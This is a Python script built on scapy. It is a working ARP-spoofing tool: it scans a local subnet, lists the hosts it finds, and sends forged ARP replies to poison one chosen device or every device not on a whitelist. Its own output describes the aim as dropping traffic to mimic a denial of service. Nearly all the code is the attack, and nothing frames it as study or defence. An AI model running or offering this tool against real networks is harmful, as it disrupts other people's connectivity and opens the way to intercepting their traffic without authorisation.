#!/usr/bin/env python3
from scapy.all import *
import time
import sys
import socket
from colorama import Fore, Style
import netifaces

def get_network_info(interface):
    try:
        gateways = netifaces.gateways()
        gateway_ip = gateways['default'][netifaces.AF_INET][0]
        return gateway_ip
    except Exception as e:
        print(f"{Fore.RED}[-] Error detecting gateway: {e}{Style.RESET_ALL}")
        return None

def scan_network(interface="wlan0"):
    print(f"{Fore.YELLOW}[*] Scanning network for live hosts...{Style.RESET_ALL}")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.110.0/24"), timeout=2, iface=interface, verbose=False)
    devices = []
    for _, rcv in ans:
        # Attempt to resolve hostname
        try:
            hostname = socket.getfqdn(rcv.psrc)
            device_name = hostname if hostname != rcv.psrc else "Unknown"
        except:
            device_name = "Unknown"
        devices.append({"ip": rcv.psrc, "mac": rcv.hwsrc, "name": device_name})
    return devices

def print_devices(devices):
    print(f"\n{Fore.GREEN}[+] Found {len(devices)} devices:{Style.RESET_ALL}")
    for i, dev in enumerate(devices):
        print(f"{i+1}. IP: {dev['ip']}\tMAC: {dev['mac']}\tName: {dev['name']}")

def get_whitelist():
    whitelist = []
    print(f"{Fore.CYAN}[?] Enter IP addresses to whitelist (one per line, press Enter twice to finish):{Style.RESET_ALL}")
    while True:
        ip = input("IP: ").strip()
        if ip == "":
            break
        whitelist.append(ip)
    return whitelist

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    try:
        print(f"{Fore.RED}[!] ARP Spoofing: {target_ip} -> {gateway_ip} (Dropping packets to mimic DoS){Style.RESET_ALL}")
        while True:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=interface, verbose=False)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Restoring ARP tables for {target_ip}...{Style.RESET_ALL}")
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, iface=interface, verbose=False)

def arp_spoof_all(devices, gateway_ip, gateway_mac, interface, whitelist):
    try:
        print(f"{Fore.RED}[!] ARP Spoofing ALL devices (except whitelisted) -> {gateway_ip} (Dropping packets to mimic DoS){Style.RESET_ALL}")
        while True:
            for dev in devices:
                if dev["ip"] not in whitelist:
                    sendp(Ether(dst=dev["mac"])/ARP(op=2, pdst=dev["ip"], psrc=gateway_ip, hwdst=dev["mac"]), iface=interface, verbose=False)
                    sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=dev["ip"], hwdst=gateway_mac), iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Restoring ARP tables for all devices...{Style.RESET_ALL}")
        for dev in devices:
            if dev["ip"] not in whitelist:
                sendp(Ether(dst=dev["mac"])/ARP(op=2, pdst=dev["ip"], psrc=gateway_ip, hwdst=dev["mac"], hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
                sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=dev["ip"], hwdst=gateway_mac, hwsrc=dev["mac"]), count=5, iface=interface, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <interface>")
        sys.exit(1)
    
    interface = sys.argv[1]
    gateway_ip = get_network_info(interface)
    if not gateway_ip:
        gateway_ip = input(f"{Fore.CYAN}[?] Enter gateway IP: {Style.RESET_ALL}")

    devices = scan_network(interface)
    if not devices:
        print(f"{Fore.RED}[-] No devices found. Check your interface.{Style.RESET_ALL}")
        sys.exit(1)
    
    print_devices(devices)
    
    whitelist = get_whitelist()
    print(f"{Fore.GREEN}[+] Whitelist: {whitelist}{Style.RESET_ALL}")

    try:
        mode = input(f"\n{Fore.CYAN}[?] Select mode - (1) Single target, (2) All devices: {Style.RESET_ALL}")
        if mode not in ["1", "2"]:
            print(f"{Fore.RED}[-] Invalid mode selected.{Style.RESET_ALL}")
            sys.exit(1)
        
        # Find gateway MAC
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), timeout=2, iface=interface, verbose=False)
        if not ans:
            print(f"{Fore.RED}[-] Could not find gateway MAC.{Style.RESET_ALL}")
            sys.exit(1)
        gateway_mac = ans[0][1].hwsrc

        if mode == "1":
            choice = int(input(f"{Fore.CYAN}[?] Select target (number): {Style.RESET_ALL}")) - 1
            if choice < 0 or choice >= len(devices):
                print(f"{Fore.RED}[-] Invalid choice.{Style.RESET_ALL}")
                sys.exit(1)
            
            target_ip = devices[choice]["ip"]
            if target_ip in whitelist:
                print(f"{Fore.RED}[-] Target {target_ip} is in whitelist. Cannot spoof.{Style.RESET_ALL}")
                sys.exit(1)
            target_mac = devices[choice]["mac"]
            arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        else:  # mode == "2"
            arp_spoof_all(devices, gateway_ip, gateway_mac, interface, whitelist)
            
    except ValueError:
        print(f"{Fore.RED}[-] Invalid input.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exiting...{Style.RESET_ALL}")
